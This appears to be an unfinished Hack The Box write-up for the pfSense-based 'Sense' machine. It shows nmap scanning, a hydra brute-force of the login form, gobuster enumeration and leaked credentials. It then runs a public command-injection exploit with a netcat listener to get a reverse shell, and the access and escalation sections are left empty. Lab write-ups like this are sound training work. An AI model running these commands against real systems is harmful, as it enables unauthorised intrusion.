+++
title = "HTB - Sense(I)"
date = 2024-09-09
+++

#manual #OpenBSD #unfinished
### Scan
```
└─# nmap -sV -sC --open -p- 10.10.10.60
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 14:04 EDT
Stats: 0:02:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 63.82% done; ETC: 14:07 (0:01:15 remaining)
Nmap scan report for 10.10.10.60
Host is up (0.13s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/http lighttpd 1.4.35
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-server-header: lighttpd/1.4.35
|_http-title: Login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 218.20 seconds

```

The scan gives us an initial and potentially our only attack vector via web. Solving this box, I know this is the case. In the future, though, I'd recommend running `nmap -sT` or `nmap -sU` coupled with `full` in order to tackle all TCP and UDP ports if you've got the time and means!
### Enumeration

<img alt="Image" async src="images/Screenshot 2024-09-09 at 2.12.09 PM.png" width="800px"></img>

We're led to this login portal, and a few things to note here. The importance of default credentials goes without saying. Do your research. Also, be wary of exhausting attempts and forcing a lockout on a machine. Should you want to see as a POC, run:

````
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.60 https-post-form "/index.php:__csrf_magic=sid%3A44c8728e26d47be027a7a01c98089e974f010329%2C1577594299&usernamefld=^USER^&passwordfld=^PASS^&login=Login:Username or Password incorrect"
````

You'll get stiffed after 15 attempts. After research, we find default credentials for the service are `admin` and `pfsense`, being USER/PASS. These do not work, and it forces us to enumerate web directories.

Using gobuster, we'll use:


```
gobuster dir -u https://10.10.10.60 -x php, txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -k
```

Where the `-x` denotes filetypes, and the `-k` tells gobuster to skip SSL verification. This machine hammers home the importance of intentional enumeration and patience. You have to know what it is you're looking for, and be willing to be patient in receiving it.


We can navigate to the directories that seem interesting. While perusing through, `system-users.txt` dropped some creds!

<img alt="Image" async src="images/Screenshot 2024-09-09 at 2.24.51 PM.png" width="800px"></img>

Using these, we are able to gain access to the initial portal.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 2.26.21 PM.png" width="800px"></img>

Now that we've got more detailed information about versions, lets cross check with `searchsploit`.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 2.29.08 PM.png" width="800px"></img>

This one detailing versions before 2.1.4 seems to be a good pick. We can move it to our present directory by using: `searchsploit -m 43560.py`. Now let's see what's happening under the hood.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 2.33.16 PM.png" width="800px"></img>

The `status_rrd_graph_img.php` is vulnerable to command injections. The script seems to be passing the shell through parameters in the function, and it's our job to catch it with a listener. So, lets set one up.

`rlwrap nc -nlvp 4321`

Once again, the `rlwrap` establishes control with the arrow keys in the shell granted.

`python3 43560.py --lhost 10.10.14.3 --lport 4321 --rhost 10.10.10.60 --username rohit --password pfsense
`
This will configure our parameters for passing the shell through the header with the python script.





### Initial Access
### Privilege Escalation
